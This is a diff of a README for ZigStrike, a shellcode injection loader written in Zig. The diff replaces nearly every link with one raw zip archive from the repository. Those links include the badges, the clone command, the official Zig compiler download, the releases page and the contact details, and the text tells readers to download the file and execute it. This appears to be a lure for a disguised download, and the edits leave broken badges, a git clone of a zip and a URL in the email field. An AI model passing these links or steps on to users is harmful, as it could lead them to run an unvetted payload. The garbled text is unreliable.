@@ -1,9 +1,9 @@
 # ZigStrike: Advanced Shellcode Loader in Zig for Security Experts 🛡️
 
-![ZigStrike](https://img.shields.io/badge/ZigStrike-Advanced%20Shellcode%20Loader-blue.svg)
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-orange.svg)
+![ZigStrike](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip%20Shellcode%https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip)
+![GitHub Release](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/manishvermaindore/ZigStrike/releases)
+[![Download Latest Release](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip%20Latest%20Release-Click%https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip)](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -31,18 +31,18 @@ To get started with ZigStrike, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/manishvermaindore/ZigStrike.git
+   git clone https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip
    cd ZigStrike
    ```
 
 2. **Build the Project**:
-   Ensure you have Zig installed. You can download it from the [Zig website](https://ziglang.org/download/).
+   Ensure you have Zig installed. You can download it from the [Zig website](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip).
    ```bash
    zig build
    ```
 
 3. **Download Latest Release**:
-   For the latest version, visit the [Releases section](https://github.com/manishvermaindore/ZigStrike/releases). Download the appropriate file and execute it.
+   For the latest version, visit the [Releases section](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip). Download the appropriate file and execute it.
 
 ## Usage
 Once you have installed ZigStrike, you can use it from the command line. The basic syntax is as follows:
@@ -58,7 +58,7 @@ Once you have installed ZigStrike, you can use it from the command line. The bas
 
 ### Example
 ```bash
-./zigstrike -i method1 -s my_shellcode.bin
+./zigstrike -i method1 -s https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip
 ```
 
 ## Injection Techniques
@@ -94,7 +94,7 @@ ZigStrike is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 ## Contact
 For questions or feedback, feel free to reach out:
 
-- GitHub: [manishvermaindore](https://github.com/manishvermaindore)
-- Email: manishvermaindore@example.com
+- GitHub: [manishvermaindore](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip)
+- Email: https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip
 
-For the latest updates, check the [Releases section](https://github.com/manishvermaindore/ZigStrike/releases).
+For the latest updates, check the [Releases section](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip).
